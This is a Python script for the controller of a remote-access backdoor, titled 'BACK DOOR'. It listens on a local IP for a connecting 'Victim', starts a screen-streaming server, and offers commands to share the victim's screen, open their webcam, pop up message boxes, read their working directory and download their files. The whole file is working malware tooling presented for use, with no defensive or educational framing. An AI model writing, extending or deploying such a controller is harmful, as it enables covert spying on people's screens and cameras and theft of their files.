# -----------All commands for BackDoor
# screen = screen share
# cwd = current working directory
# msgbox = Msg on the screen
# download_file = download file


from fileinput import filename
import socket
from vidstream import *
import sys
import time
import os
from subprocess import Popen


# ----------------------------Text for back door----------------------------


print("""  

██████   █████   ██████ ██  ███    ███████    ██████   ██████  ██████
██   ██ ██   ██ ██      ██  ██      ██   ██  ██    ██ ██    ██ ██   ██
██████  ███████ ██      ████        ██   ██  ██    ██ ██    ██ ██████  
██   ██ ██   ██ ██      ██  ██      ██   ██  ██    ██ ██    ██ ██   ██
██████  ██   ██  ██████ ██  ███    ███████    ██████   ██████  ██   ██

""")

z = """     
                       Checking the Port !
        
        [~]█████████████████████████████████████████████████[~]
"""


# ---Text Effect...
for c in z:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.02)

ip = "192.168.1.209"

# ---Main server...
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip, 7070))


print('')
print('[+] Server Started')
print('[+] Listening For Victim')


s.listen(1)
client, address = s.accept()
print(f'[+] {address} Victim opened the backdoor')

# --------All commands print----------
print('')
print(' [~] All commands for BackDoor: [~]')
print(' [+] screen = screen share')
print(' [+] msgbox = Msg on the screen')
print(' [+] download_file = download file')
print(' [+] cwd = current working directory')

# ---Starting server for screen sharign
server = StreamingServer(ip, 6061)
server.start_server()


# ---if cmd == ""   do that....
while True:
    print('')
    command = input('Enter Command : ')

    if command == "screen":
        client.send(command.encode())
    elif command == "cwd":
        client.send(command.encode())
        files = client.recv(5000).decode()
        print(f"Current Working Directory : {files}")
    elif command == "webcam":
        client.send(command.encode())
    elif command == "msgbox":
        client.send(command.encode())
    elif command == "download_file":
        client.send(command.encode())
        file_name = input(str("[+] Enter File Name : "))
        client.send(file_name.encode())
        file = client.recv(5000)
        filename = input(
            str("[+] Enter filename for the file you want to save : "))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print(f"[+] {filename} has been Saved")
